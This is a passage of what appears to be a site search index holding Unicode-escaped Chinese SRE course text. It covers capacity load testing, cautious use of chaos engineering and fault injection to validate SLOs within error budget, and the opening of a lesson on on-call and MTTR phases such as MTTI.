<p>\u53e6\u5916\uff0c\u8fd8\u6709\u4e00\u79cd\u573a\u666f\uff0c\u5982\u679c\u67d0\u4e2a\u975e\u6838\u5fc3\u5e94\u7528\u8c03\u7528Detail\u7684\u6b21\u6570\u7a81\u7136\u6fc0\u589e\uff0c\u5bf9\u4e8eDetail\u6765\u8bf4\uff0c\u5b83\u81ea\u8eab\u7684\u9650\u6d41\u4fdd\u62a4\u673a\u5236\u8981\u53d1\u6325\u4f5c\u7528\uff0c\u786e\u4fdd\u81ea\u5df1\u4e0d\u4f1a\u88ab\u5916\u90e8\u6d41\u91cf\u968f\u610f\u6253\u57ae\u3002</p> <p>\u5176\u5b9e\u7c7b\u4f3c\u4e0a\u8ff0\u8fd9\u4e24\u79cd\u573a\u666f\uff0c\u5728\u5206\u5e03\u5f0f\u7cfb\u7edf\u4e2d\u4ec5\u4ec5\u9760\u5206\u6790\u6216\u753b\u67b6\u6784\u56fe\u662f\u65e0\u6cd5\u66b4\u9732\u51fa\u6765\u7684\uff0c\u56e0\u4e3a\u4e1a\u52a1\u53d8\u66f4\u6bcf\u5929\u90fd\u5728\u505a\uff0c\u5e94\u7528\u4e4b\u95f4\u7684\u8c03\u7528\u5173\u7cfb\u548c\u8c03\u7528\u91cf\u4e5f\u5728\u968f\u65f6\u53d1\u751f\u53d8\u5316\u3002\u8fd9\u65f6\u5019\u5c31\u9700\u8981\u6709\u5bb9\u91cf\u538b\u6d4b\u8fd9\u6837\u7684\u624b\u6bb5\u6765\u6a21\u62df\u9a8c\u8bc1\uff0c\u8fdb\u800c\u66b4\u9732\u4f9d\u8d56\u5173\u7cfb\u95ee\u9898\u3002\u5e76\u4e14\uff0c\u6709\u4e9b\u95ee\u9898\u5fc5\u987b\u8981\u5728\u6781\u7aef\u573a\u666f\u4e0b\u6a21\u62df\u624d\u80fd\u9a8c\u8bc1\u51fa\u95ee\u9898\uff0c\u6bd4\u5982\u5404\u79cd\u670d\u52a1\u6cbb\u7406\u63aa\u65bd\uff0c\u53ea\u6709\u5728\u5927\u6d41\u91cf\u9ad8\u5e76\u53d1\u7684\u538b\u529b\u6d4b\u8bd5\u4e0b\uff0c\u624d\u80fd\u88ab\u9a8c\u8bc1\u51fa\u662f\u5426\u6709\u6548\u3002</p> <p>Chaos Engineering-\u6df7\u6c8c\u5de5\u7a0b</p> <p>\u597d\u4e86\uff0c\u63a5\u4e0b\u6765\u770b\u7b2c\u4e8c\u79cd\u6df7\u6c8c\u5de5\u7a0b\u3002</p> <p>\u6211\u4eec\u77e5\u9053\uff0c\u73b0\u5728\u6df7\u6c8c\u529f\u80fd\u975e\u5e38\u6d41\u884c\uff0c\u56e0\u4e3a\u5b83\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u505a\u5230\u5728\u7ebf\u4e0a\u6a21\u62df\u771f\u5b9e\u7684\u6545\u969c\uff0c\u505a\u7ebf\u4e0a\u5e94\u6025\u6f14\u7ec3\uff0c\u63d0\u524d\u53d1\u73b0\u9690\u60a3\u3002\u5f88\u591a\u516c\u53f8\u90fd\u5f88\u63a8\u5d07\u8fd9\u79cd\u65b9\u6cd5\u5e76\u5728\u79ef\u6781\u5b66\u4e60\u843d\u5730\u4e2d\u3002</p> <p>\u5176\u5b9e\uff0c\u521a\u624d\u6211\u4eec\u8bb2\u5bb9\u91cf\u538b\u6d4b\u4e5f\u63d0\u5230\uff0c\u5bb9\u91cf\u538b\u6d4b\u662f\u6a21\u62df\u7ebf\u4e0a\u771f\u5b9e\u7684\u7528\u6237\u8bbf\u95ee\u884c\u4e3a\u7684\uff0c\u4f46\u662f\u538b\u6d4b\u8fc7\u7a0b\u4e2d\uff0c\u5982\u679c\u6211\u4eec\u6a21\u62df\u6781\u7aef\u573a\u666f\uff0c\u53ef\u80fd\u4e5f\u4f1a\u9020\u6210\u5f02\u5e38\u53d1\u751f\uff0c\u4f46\u8fd9\u65f6\u7684\u5f02\u5e38\u662f\u88ab\u52a8\u53d1\u751f\u7684\uff0c\u4e0d\u8fc7\u4ece\u6548\u679c\u4e0a\u6765\u8bb2\uff0c\u5176\u5b9e\u8ddf\u6df7\u6c8c\u5de5\u7a0b\u5c31\u5f88\u76f8\u4f3c\u4e86\u3002\u53ea\u4e0d\u8fc7\uff0c\u6df7\u6c8c\u5de5\u7a0b\u662f\u6a21\u62df\u6545\u969c\u53d1\u751f\u573a\u666f\uff0c\u4e3b\u52a8\u4ea7\u751f\u7ebf\u4e0a\u5f02\u5e38\u548c\u6545\u969c\u3002</p> <p>\u90a3\u6211\u4eec\u600e\u4e48\u628a\u6df7\u6c8c\u5de5\u7a0b\u5e94\u7528\u5728SRE\u4e2d\u5462\uff1f\u4e00\u822c\u6765\u8bf4\uff0c\u6545\u969c\u53d1\u751f\u7684\u5c42\u9762\u4e0d\u540c\uff0c\u6211\u4eec\u91c7\u53d6\u7684\u65b9\u5f0f\u4e5f\u4f1a\u4e0d\u540c\u3002</p> <p>\u8fd9\u91cc\u6211\u7b80\u5355\u4ecb\u7ecd\u4e00\u4e0b\uff0c\u6bd4\u5982\u5bf9\u4e8e\u673a\u623f\u6545\u969c\uff0c\u6709\u4e9b\u5927\u5382\u4f1a\u76f4\u63a5\u6a21\u62df\u65ad\u7535\u8fd9\u6837\u7684\u573a\u666f\uff0c\u770b\u673a\u623f\u662f\u5426\u53ef\u4ee5\u5207\u6362\u5230\u53cc\u6d3b\u6216\u5907\u7528\u673a\u623f\uff1b\u5728\u7f51\u7edc\u5c42\u9762\uff0c\u6211\u4eec\u4f1a\u6a21\u62df\u4e22\u5305\u6216\u7f51\u5361\u6d41\u91cf\u6253\u6ee1\uff1b\u786c\u4ef6\u548c\u7cfb\u7edf\u5c42\u9762\uff0c\u53ef\u80fd\u6545\u610f\u628a\u4e00\u5757\u78c1\u76d8\u5199\u6ee1\uff0c\u6216\u8005\u628aCPU\u8dd1\u6ee1\uff0c\u751a\u81f3\u76f4\u63a5\u628a\u4e00\u4e2a\u670d\u52a1\u5668\u91cd\u542f\uff1b\u5e94\u7528\u5c42\u9762\uff0c\u66f4\u591a\u5730\u4f1a\u505a\u4e00\u4e9b\u6545\u969c\u6ce8\u5165\uff0c\u6bd4\u5982\u589e\u52a0\u67d0\u4e2a\u63a5\u53e3\u65f6\u5ef6\uff0c\u76f4\u63a5\u8fd4\u56de\u9519\u8bef\u5f02\u5e38\uff0c\u7ebf\u7a0b\u6c60\u8dd1\u6ee1\uff0c\u751a\u81f3\u4e00\u4e2a\u5e94\u7528\u96c6\u7fa4\u76f4\u63a5\u4e0b\u7ebf\u4e00\u534a\u6216\u66f4\u591a\u673a\u5668\u7b49\u3002</p> <p>\u5176\u5b9e\u6df7\u6c8c\u5de5\u7a0b\u4e5f\u662f\u4e00\u4e2a\u975e\u5e38\u590d\u6742\u7684\u7cfb\u7edf\u5316\u5de5\u7a0b\uff0c\u56e0\u4e3a\u8981\u5728\u7ebf\u4e0a\u5236\u9020\u6545\u969c\uff0c\u6216\u591a\u6216\u5c11\u90fd\u8981\u5bf9\u7ebf\u4e0a\u4e1a\u52a1\u9020\u6210\u5f71\u54cd\uff0c\u5982\u679c\u6a21\u62df\u6545\u969c\u9020\u6210\u7684\u771f\u5b9e\u5f71\u54cd\u8d85\u8fc7\u4e86\u9884\u4f30\u5f71\u54cd\uff0c\u4e5f\u8981\u80fd\u591f\u5feb\u901f\u9694\u79bb\uff0c\u5e76\u5feb\u901f\u6062\u590d\u6b63\u5e38\u4e1a\u52a1\u3002\u5373\u4f7f\u662f\u5728\u7a33\u5b9a\u6027\u4f53\u7cfb\u5df2\u7ecf\u975e\u5e38\u5b8c\u5584\u7684\u60c5\u51b5\u4e0b\uff0c\u5bf9\u4e8e\u6df7\u6c8c\u5de5\u7a0b\u7684\u5b9e\u65bd\u4e5f\u8981\u6781\u4e3a\u8c28\u614e\u5c0f\u5fc3\u3002\u5bf9\u4e8e\u4e00\u4e2a\u6a21\u62df\u7b56\u7565\u4e0a\u7ebf\u5b9e\u65bd\uff0c\u4e00\u5b9a\u662f\u5728\u4e00\u4e2a\u9694\u79bb\u7684\u73af\u5883\u4e2d\u7ecf\u8fc7\u4e86\u5927\u91cf\u53cd\u590d\u9a8c\u8bc1\uff0c\u5305\u62ec\u5f02\u5e38\u60c5\u51b5\u4e0b\u7684\u6062\u590d\u9884\u6848\u5b9e\u65bd\uff0c\u786e\u4fdd\u5f71\u54cd\u53ef\u63a7\u4e4b\u540e\uff0c\u5728\u7ecf\u8fc7\u591a\u65b9\u56e2\u961f\u8bc4\u5ba1\u6216\u9a8c\u8bc1\uff0c\u624d\u6700\u7ec8\u5728\u7ebf\u4e0a\u5b9e\u65bd\u3002</p> <p>\u4ece\u8fd9\u4e2a\u89d2\u5ea6\u6765\u8bb2SRE\u548c\u6df7\u6c8c\u5de5\u7a0b\u662f\u4ec0\u4e48\u5173\u7cfb\uff0c\u5c31\u975e\u5e38\u6e05\u6670\u4e86\uff0c\u6df7\u6c8c\u5de5\u7a0b\u662fSRE\u7a33\u5b9a\u6027\u4f53\u7cfb\u5efa\u8bbe\u7684\u9ad8\u7ea7\u9636\u6bb5\uff0c\u4e00\u5b9a\u662fSRE\u4f53\u7cfb\u5728\u670d\u52a1\u6cbb\u7406\u3001\u5bb9\u91cf\u538b\u6d4b\u3001\u94fe\u8def\u8ddf\u8e2a\u3001\u76d1\u63a7\u544a\u8b66\u3001\u8fd0\u7ef4\u81ea\u52a8\u5316\u7b49\u76f8\u5bf9\u57fa\u7840\u548c\u5fc5\u9700\u7684\u90e8\u5206\u975e\u5e38\u5b8c\u5584\u7684\u60c5\u51b5\u4e0b\u624d\u4f1a\u8003\u8651\u7684\u3002</p> <p>\u6240\u4ee5\uff0c\u5f15\u5165\u6df7\u6c8c\u5de5\u7a0b\u624b\u6bb5\u8981\u975e\u5e38\u614e\u91cd\uff0c\u6211\u5efa\u8bae\u5927\u53ef\u4e0d\u5fc5\u8ddf\u98ce\u8fc7\u65e9\u5f15\u5165\uff0c\u8fd8\u662f\u4f18\u5148\u4e00\u6b65\u6b65\u6253\u597d\u57fa\u7840\u518d\u505a\u8003\u8651\u3002</p>"},{"location":"ops/50-sre-mogu-05/#_3","title":"\u5e94\u8be5\u5728\u4ec0\u4e48\u65f6\u673a\u505a\u7cfb\u7edf\u9a8c\u8bc1\uff1f","text":"<p>\u6211\u4eec\u6709\u4e86\u9a8c\u8bc1\u6574\u4e2a\u7cfb\u7edfSLO\u7684\u624b\u6bb5\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c\u8fd9\u4e24\u4e2a\u624b\u6bb5\u90fd\u662f\u8981\u5728\u751f\u4ea7\u7cfb\u7edf\u4e0a\u76f4\u63a5\u5b9e\u65bd\u7684\uff0c\u4e3a\u4e86\u4fdd\u8bc1\u6211\u4eec\u7684\u4e1a\u52a1\u6b63\u5e38\u8fd0\u884c\uff0c\u90a3\u6211\u4eec\u5e94\u8be5\u9009\u62e9\u5728\u4ec0\u4e48\u65f6\u673a\uff0c\u4ee5\u53ca\u4ec0\u4e48\u6761\u4ef6\u4e0b\u505a\u7cfb\u7edf\u9a8c\u8bc1\u5462\uff1f</p> <p>\u6211\u4eec\u53ef\u4ee5\u53c2\u8003Google\u7ed9\u51fa\u7684\u5efa\u8bae\u3002</p> <p>\u6838\u5fc3\u5c31\u662f\u9519\u8bef\u9884\u7b97\u5145\u8db3\u5c31\u53ef\u4ee5\u5c1d\u8bd5\uff0c\u5c3d\u91cf\u907f\u5f00\u9519\u8bef\u9884\u7b97\u4e0d\u8db3\u7684\u65f6\u95f4\u6bb5\u3002\u56e0\u4e3a\u5728\u6b63\u5e38\u4e1a\u52a1\u4e0b\uff0c\u6211\u4eec\u8981\u5b8c\u6210SLO\u5df2\u7ecf\u6709\u5f88\u5927\u7684\u538b\u529b\u4e86\uff0c\u4e0d\u80fd\u518d\u7ed9\u7cfb\u7edf\u7a33\u5b9a\u6027\u589e\u52a0\u65b0\u7684\u98ce\u9669\u3002</p> <p>\u540c\u65f6\uff0c\u6211\u4eec\u8fd8\u8981\u8bc4\u4f30\u6545\u969c\u6a21\u62df\u5e26\u6765\u7684\u5f71\u54cd\uff0c\u6bd4\u5982\uff0c\u662f\u5426\u4f1a\u635f\u5bb3\u5230\u516c\u53f8\u6536\u76ca\uff1f\u662f\u5426\u4f1a\u635f\u5bb3\u7528\u6237\u4f53\u9a8c\u76f8\u5173\u7684\u6307\u6807\uff1f\u5982\u679c\u9020\u6210\u7684\u4e1a\u52a1\u5f71\u54cd\u5f88\u5927\uff0c\u90a3\u5c31\u8981\u628a\u5f15\u5165\u65b9\u6848\u8fdb\u884c\u7c92\u5ea6\u7ec6\u5316\uff0c\u5206\u6b65\u9aa4\uff0c\u907f\u514d\u9020\u6210\u4e0d\u53ef\u9884\u4f30\u7684\u635f\u5931\u3002</p> <p>\u8fd9\u91cc\uff0c\u6211\u548c\u56e2\u961f\u901a\u5e38\u7684\u505a\u6cd5\uff0c\u5c31\u662f\u9009\u62e9\u51cc\u6668\uff0c\u4e1a\u52a1\u91cf\u76f8\u5bf9\u8f83\u5c0f\u7684\u60c5\u51b5\u4e0b\u505a\u6f14\u7ec3\u3002\u8fd9\u6837\u5373\u4f7f\u51fa\u73b0\u95ee\u9898\uff0c\u5f71\u54cd\u9762\u4e5f\u53ef\u63a7\uff0c\u800c\u4e14\u4f1a\u6709\u6bd4\u8f83\u5145\u8db3\u7684\u65f6\u95f4\u6267\u884c\u6062\u590d\u64cd\u4f5c\uff0c\u540c\u65f6\uff0c\u5728\u505a\u8f83\u5927\u89c4\u6a21\u7684\u5168\u7ad9\u6f14\u7ec3\u524d\uff0c\u6bd4\u5982\u5168\u94fe\u8def\u7684\u538b\u6d4b\uff0c\u4f1a\u505a\u5355\u94fe\u8def\u548c\u5355\u4e1a\u52a1\u7684\u5355\u72ec\u6f14\u7ec3\uff0c\u53ea\u6709\u5355\u94fe\u8def\u5168\u90e8\u6f14\u7ec3\u901a\u8fc7\uff0c\u624d\u4f1a\u6267\u884c\u66f4\u5927\u89c4\u6a21\u7684\u591a\u94fe\u8def\u548c\u5168\u94fe\u8def\u540c\u65f6\u6f14\u7ec3\u3002</p> <p>\u603b\u4e4b\uff0c\u751f\u4ea7\u7cfb\u7edf\u7684\u7a33\u5b9a\u6027\u5728\u4efb\u4f55\u65f6\u5019\uff0c\u90fd\u662f\u6700\u9ad8\u4f18\u5148\u7ea7\u8981\u4fdd\u8bc1\u7684\uff0c\u51b3\u4e0d\u80fd\u56e0\u4e3a\u6f14\u7ec3\u5bfc\u81f4\u7cfb\u7edf\u5f02\u5e38\u6216\u6545\u969c\uff0c\u8fd9\u4e5f\u662f\u4e0d\u88ab\u5141\u8bb8\u7684\u3002\u6240\u4ee5\uff0c\u4e00\u5b9a\u8981\u9009\u62e9\u5408\u9002\u7684\u65f6\u673a\uff0c\u5728\u6709\u5145\u5206\u51c6\u5907\u548c\u9884\u6848\u7684\u60c5\u51b5\u4e0b\u5b9e\u65bd\u5404\u7c7b\u9a8c\u8bc1\u5de5\u4f5c\u3002\u603b\u7ed3</p>"},{"location":"ops/50-sre-mogu-05/#_4","title":"\u603b\u7ed3","text":"<p>\u4eca\u5929\u6211\u4eec\u7ed3\u5408\u4e00\u4e2a\u7535\u5546\u6848\u4f8b\uff0c\u8ba8\u8bba\u4e86\u5728\u843d\u5730SLO\u65f6\u8fd8\u8981\u8003\u8651\u7684\u4e00\u4e9b\u5b9e\u9645\u56e0\u7d20\u3002\u4f60\u9700\u8981\u91cd\u70b9\u638c\u63e1\u4ee5\u4e0b4\u70b9\uff1a</p> <ul> <li>\u5148\u8bbe\u5b9a\u6838\u5fc3\u94fe\u8def\u7684SLO\uff0c\u7136\u540e\u6839\u636e\u6838\u5fc3\u94fe\u8def\u8fdb\u884cSLO\u7684\u5206\u89e3\u3002</li> <li>\u786e\u5b9a\u4e00\u4e2a\u7cfb\u7edf\u7684\u6838\u5fc3\u94fe\u8def\uff0c\u5173\u952e\u662f\u786e\u8ba4\u6838\u5fc3\u5e94\u7528\u548c\u975e\u6838\u5fc3\u5e94\u7528\uff0c\u4ee5\u53ca\u5f3a\u5f31\u4f9d\u8d56\u5173\u7cfb\u3002\u8fd9\u4e2a\u8fc7\u7a0b\u5728\u521d\u59cb\u6267\u884c\u65f6\uff0c\u9700\u8981\u5927\u91cf\u4eba\u5de5\u6295\u5165\u548c\u5206\u6790\uff0c\u4f46\u662f\u8fd9\u4e2a\u8fc7\u7a0b\u4e0d\u80fd\u5ffd\u7565\u3002</li> <li>\u5f3a\u4f9d\u8d56\u7684\u6838\u5fc3\u5e94\u7528SLO\u5fc5\u987b\u4e0e\u6838\u5fc3\u94fe\u8defSLO\u4e00\u81f4\uff0c\u5f31\u4f9d\u8d56\u7684\u975e\u6838\u5fc3\u5e94\u7528SLO\u53ef\u4ee5\u964d\u4f4e\uff0c\u4f46\u662f\u5fc5\u987b\u8981\u6709\u5bf9\u5e94\u7684\u9650\u6d41\u964d\u7ea7\u7b49\u670d\u52a1\u6cbb\u7406\u624b\u6bb5\u3002</li> <li>\u901a\u8fc7\u5bb9\u91cf\u538b\u6d4b\u548c\u6df7\u6c8c\u5de5\u7a0b\u7b49\u624b\u6bb5\uff0c\u5bf9\u4e0a\u8ff0\u8fc7\u7a0b\u8fdb\u884c\u9a8c\u8bc1\uff0c\u4f46\u662f\u4e00\u5b9a\u8981\u5728\u9519\u8bef\u9884\u7b97\u5145\u8db3\u7684\u60c5\u51b5\u4e0b\u6267\u884c\u3002</li> </ul>"},{"location":"ops/50-sre-mogu-06/","title":"06 | \u6545\u969c\u53d1\u73b0\uff1a\u5982\u4f55\u5efa\u8bbeOn-Call\u673a\u5236\uff1f","text":"<p>\u5728\u4e0a\u4e00\u90e8\u5206\uff0c\u6211\u4eec\u5b66\u4e60\u4e86SRE\u7684\u57fa\u7840\uff0c\u9700\u8981\u638c\u63e1\u7684\u91cd\u70b9\u662fSLI\u548cSLO\u4ee5\u53caError Budget\uff08\u9519\u8bef\u9884\u7b97\uff09\u7b56\u7565\u3002SLI\u662f\u6211\u4eec\u9009\u62e9\u7684\u8861\u91cf\u7cfb\u7edf\u7a33\u5b9a\u6027\u7684\u6307\u6807\uff0cSLO\u662f\u6bcf\u4e2a\u6307\u6807\u5bf9\u5e94\u7684\u76ee\u6807\uff0c\u800c\u6211\u4eec\u53c8\u7ecf\u5e38\u628aSLO\u8f6c\u5316\u4e3a\u9519\u8bef\u9884\u7b97\uff0c\u56e0\u4e3a\u9519\u8bef\u9884\u7b97\u7684\u5f62\u5f0f\u66f4\u52a0\u76f4\u89c2\u3002\u8f6c\u5316\u540e\uff0c\u6211\u4eec\u8981\u505a\u7684\u7a33\u5b9a\u6027\u63d0\u5347\u548c\u4fdd\u969c\u5de5\u4f5c\uff0c\u5176\u5b9e\u5c31\u662f\u60f3\u529e\u6cd5\u4e0d\u8981\u628a\u9519\u8bef\u9884\u7b97\u6d88\u8017\u5b8c\uff0c\u6216\u8005\u4e0d\u80fd\u628a\u9519\u8bef\u9884\u7b97\u5feb\u901f\u5927\u91cf\u5730\u6d88\u8017\u6389\u3002</p> <p>\u8fd9\u4e48\u8bf4\uff0c\u4e3b\u8981\u662f\u9488\u5bf9\u4e24\u79cd\u60c5\u51b5\uff1a\u4e00\u79cd\u662f\u6211\u4eec\u5236\u5b9a\u7684\u9519\u8bef\u9884\u7b97\u5728\u5468\u671f\u8fd8\u6ca1\u6709\u7ed3\u675f\u4e4b\u524d\u5c31\u6d88\u8017\u5b8c\u4e86\uff0c\u8fd9\u80af\u5b9a\u5c31\u610f\u5473\u7740\u7a33\u5b9a\u6027\u76ee\u6807\u8fbe\u4e0d\u6210\u4e86\uff1b\u53e6\u4e00\u79cd\u60c5\u51b5\u662f\u9519\u8bef\u9884\u7b97\u5728\u5355\u6b21\u95ee\u9898\u4e2d\u88ab\u6d88\u8017\u8fc7\u591a\uff0c\u8fd9\u65f6\u5019\u6211\u4eec\u4e5f\u8981\u628a\u8fd9\u6837\u7684\u95ee\u9898\u5b9a\u6027\u4e3a\u6545\u969c\u3002</p> <p>\u4eca\u5929\uff0c\u6211\u4eec\u5c31\u6765\u804a\u4e00\u804a\uff0c\u4e3a\u4e86\u6700\u5927\u7a0b\u5ea6\u5730\u907f\u514d\u9519\u8bef\u9884\u7b97\u88ab\u6d88\u8017\uff0c\u5f53\u6211\u4eec\u5b9a\u4e49\u4e00\u4e2a\u95ee\u9898\u4e3a\u6545\u969c\u65f6\uff0c\u6211\u4eec\u5e94\u8be5\u91c7\u53d6\u4ec0\u4e48\u63aa\u65bd\u3002</p>"},{"location":"ops/50-sre-mogu-06/#mttr","title":"\u805a\u7126MTTR\uff0c\u6545\u969c\u5904\u7406\u7684\u5173\u952e\u73af\u8282","text":"<p>\u597d\u4e86\uff0c\u6211\u4eec\u5148\u56de\u987e\u4e0b\u5728\u7b2c1\u8bb2\u7684\u65f6\u5019\uff0c\u63d0\u5230\u6545\u969c\u5904\u7406\u7684\u73af\u8282\u5c31\u662fMTTR\uff0c\u5b83\u53c8\u7ec6\u5206\u4e3a4\u4e2a\u6307\u6807\uff1aMTTI\u3001MTTK\u3001MTTF\u548cMTTV\uff0c\u4e4b\u6240\u4ee5\u5206\u7ec4\u5206\u5757\uff0c\u4e5f\u662f\u4e3a\u4e86\u66f4\u52a0\u6709\u76ee\u7684\u6027\u5730\u505a\u5230\u7cfb\u7edf\u7a33\u5b9a\u6027\u3002</p> <p></p> <p>\u90a3\u4e48\uff0c\u8fd9\u56db\u4e2a\u73af\u8282\uff0c\u5728\u6211\u4eec\u6545\u969c\u5904\u7406MTTR\u53c8\u5404\u81ea\u5360\u591a\u957f\u65f6\u95f4\u5462\uff1f\u4e0b\u9762\u8fd9\u4e2aMTTR\u7684\u65f6\u957f\u5206\u5e03\u56fe\uff0c\u662fIBM\u5728\u505a\u4e86\u5927\u91cf\u7684\u7edf\u8ba1\u5206\u6790\u4e4b\u540e\u7ed9\u51fa\u7684\u3002</p> <p></p> <p>\u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0cMTTK\u90e8\u5206\uff0c\u4e5f\u5c31\u662f\u6545\u969c\u5b9a\u4f4d\u90e8\u5206\u7684\u65f6\u957f\u5360\u6bd4\u6700\u5927\u3002\u8fd9\u4e00\u70b9\uff0c\u6211\u4eec\u5e94\u8be5\u90fd\u4f1a\u6709\u4e00\u4e9b\u5171\u9e23\uff0c\u5c31\u662f\u7edd\u5927\u90e8\u5206\u7684\u6545\u969c\uff0c\u5f80\u5f80\u53ea\u8981\u80fd\u5b9a\u4f4d\u51fa\u95ee\u9898\u51fa\u5728\u54ea\u513f\u4e86\uff0c\u4e00\u822c\u90fd\u53ef\u4ee5\u5feb\u901f\u5730\u89e3\u51b3\u6545\u969c\uff0c\u6162\u5c31\u6162\u5728\u4e0d\u77e5\u9053\u95ee\u9898\u51fa\u5728\u54ea\u513f\uff0c\u6240\u4ee5\u8bf4\u6211\u4eec\u5927\u90e8\u5206\u65f6\u95f4\u90fd\u82b1\u5728\u5bfb\u627e\u95ee\u9898\u4e0a\u4e86\u3002</p> <p>\u4e0d\u8fc7\uff0c\u4ece\u6211\u5b9e\u9645\u5206\u6790\u7684\u60c5\u51b5\u770b\uff0c\u5f88\u591a\u65f6\u5019MTTR\u7684\u65f6\u95f4\u5206\u5e03\u8ddf\u8fd9\u4e2a\u56fe\u4f1a\u6709\u4e00\u4e9b\u5dee\u522b\uff0c\u4e3a\u4ec0\u4e48\u5462\uff1f</p> <p>\u56e0\u4e3a\u4e0a\u9762\u8fd9\u5f20\u56fe\u662fIBM\u9488\u5bf9\u7f51\u7edc\u8bbe\u65bd\u7684\u6545\u969c\u7edf\u8ba1\u51fa\u6765\u7684\uff0c\u9274\u4e8e\u7f51\u7edc\u8bbe\u5907\u90e8\u7f72\u6a21\u5f0f\u76f8\u5bf9\u7b80\u5355\uff0c\u4ee5\u53ca\u65e5\u5fd7\u548c\u62a5\u9519\u4fe1\u606f\u6bd4\u8f83\u56fa\u5b9a\u548c\u660e\u786e\uff0c\u6240\u4ee5\u51fa\u73b0\u95ee\u9898\u65f6\uff0cMTTI\u7684\u5224\u5b9a\u9636\u6bb5\u4e0d\u4f1a\u82b1\u592a\u591a\u65f6\u95f4\u3002\u800c\u4e14\u771f\u7684\u51fa\u73b0\u95ee\u9898\uff0c\u57fa\u672c\u4e0a\u91c7\u53d6\u7684\u7b56\u7565\u4e00\u822c\u4e5f\u662f\u5b9a\u4f4d\u5230\u6839\u56e0\uff0c\u518d\u91c7\u53d6\u63aa\u65bd\u5904\u7406\u6545\u969c\uff0c\u9664\u4e86\u4e3b\u5907\u5207\u6362\u7b49\u5197\u4f59\u63aa\u65bd\uff0c\u57fa\u672c\u662f\u6ca1\u6709\u592a\u591a\u5176\u5b83\u624b\u6bb5\u3002</p> <p>\u4f46\u662f\uff0c\u5728\u4e00\u4e2a\u5206\u5e03\u5f0f\u7684\u8f6f\u4ef6\u7cfb\u7edf\u4e0b\uff0c\u6211\u4eec\u5224\u5b9a\u4e00\u4e2a\u95ee\u9898\u53d1\u751f\u5728\u54ea\u513f\uff0c\u5f71\u54cd\u8303\u56f4\u5230\u5e95\u662f\u600e\u4e48\u6837\u7684\uff0c\u8981\u53ec\u96c6\u54ea\u4e9b\u4eba\u5171\u540c\u53c2\u4e0e\u5b9a\u4f4d\u6392\u67e5\u7b49\u7b49\uff0c\u8fd9\u4e2a\u53cd\u800c\u4f1a\u6d88\u8017\u66f4\u591a\u65f6\u95f4\uff0c\u6240\u4ee5\u6211\u4eec\u770b\u5230MTTI\u9636\u6bb5\u5360\u6bd4\u4f1a\u66f4\u91cd\u3002</p> <p>\u53e6\u5916\uff0c\u5f53\u4e00\u4e2a\u5206\u5e03\u5f0f\u7cfb\u7edf\u53d1\u751f\u6545\u969c\u65f6\uff0c\u6211\u4eec\u7684\u7b56\u7565\u4e00\u5b9a\u4e0d\u662f\u627e\u5230\u6839\u56e0\uff0c\u800c\u662f\u4f18\u5148\u6062\u590d\u4e1a\u52a1\u3002\u6240\u4ee5\uff0c\u6211\u4eec\u5f80\u5f80\u662f\u901a\u8fc7\u6545\u969c\u9694\u79bb\u7684\u65b9\u5f0f\uff0c\u5148\u5feb\u901f\u6062\u590d\u4e1a\u52a1\uff0c\u4e5f\u5c31\u662f\u6211\u4eec\u7ecf\u5e38\u542c\u5230\u7684Design for Failure\u8fd9\u6837\u7684\u7b56\u7565\uff0c\u518d\u5177\u4f53\u4e00\u70b9\uff0c\u5c31\u662f\u670d\u52a1\u9650\u6d41\u3001\u964d\u7ea7\u3001\u7194\u65ad\u751a\u81f3\u662f\u4e3b\u5907\u5207\u6362\u8fd9\u6837\u7684\u624b\u6bb5\uff0c\u8fd9\u6837\u7684\u8bdd\uff0cMTTK\u7684\u5360\u6bd4\u4f1a\u6709\u6240\u4e0b\u964d\u3002</p> <p>\u56e0\u6b64\uff0c\u4ece\u5206\u5e03\u5f0f\u7cfb\u7edf\u7684\u5b9e\u9645\u60c5\u51b5\u6765\u770b\uff0c\u6574\u4e2aMTTR\u7684\u65f6\u95f4\u5360\u6bd4\u5206\u5e03\u5927\u81f4\u662f\u8fd9\u6837\u7684\uff1a</p> <p></p> <p>\u5176\u5b9e\uff0c\u4e0d\u7ba1\u662f\u4e0d\u662f\u5206\u5e03\u5f0f\u7cfb\u7edf\uff0c\u6211\u4eec\u9488\u5bf9\u5904\u7406\u6545\u969c\u7684\u76ee\u7684\u90fd\u662f\u6bd4\u8f83\u660e\u786e\u7684\uff0c\u5c31\u662f\u8981\u63d0\u5347\u6bcf\u4e2a\u73af\u8282\u7684\u5904\u7406\u6548\u7387\uff0c\u7f29\u77ed\u5b83\u4eec\u7684\u5904\u7406\u65f6\u95f4\uff0c\u8fd9\u6837\u624d\u4f1a\u7f29\u77ed\u6574\u4e2aMTTR\uff0c\u51cf\u5c11\u5bf9\u4e0d\u53ef\u7528\u65f6\u957f\u7684\u6d88\u8017\u3002</p> <p>\u4eca\u5929\uff0c\u6211\u4eec\u5c31\u5148\u6765\u770bMTTR\u7684\u7b2c\u4e00\u4e2a\u73af\u8282\uff0cMTTI\u3002\u770b\u770b\u5728MTTI\u8fd9\u4e2a\u73af\u8282\u6211\u4eec\u53ef\u4ee5\u91c7\u53d6\u54ea\u4e9b\u63aa\u65bd\u6765\u63d0\u9ad8\u5904\u7406\u6545\u969c\u6548\u7387\u3002\u5173\u4e8eMTTR\u4e2d\u7684\u53e6\u5916\u4e09\u4e2a\u73af\u8282\uff0c\u4e5f\u5c31\u662fMTTK\u3001MTTF\u548cMTTV\u6211\u4eec\u4f1a\u5728\u540e\u9762\u7684\u8bfe\u7a0b\u4e2d\u7ee7\u7eed\u8ba8\u8bba\u3002</p>"},{"location":"ops/50-sre-mogu-06/#mtti","title":"MTTI\uff1a\u4ece\u53d1\u73b0\u6545\u969c\u5230\u54cd\u5e94\u6545\u969c","text":"<p>MTTI\uff0c\u5c31\u662f\u6545\u969c\u7684\u5e73\u5747\u786e\u8ba4\u65f6\u95f4\uff0c\u4e5f\u5c31\u662f\u4ece\u6545\u969c\u5b9e\u9645\u53d1\u751f\u65f6\u95f4\u70b9\uff0c\u5230\u89e6\u53d1\u91c7\u53d6\u5b9e\u9645\u884c\u52a8\u53bb\u5b9a\u4f4d\u524d\u7684\u8fd9\u6bb5\u65f6\u95f4\u3002</p> 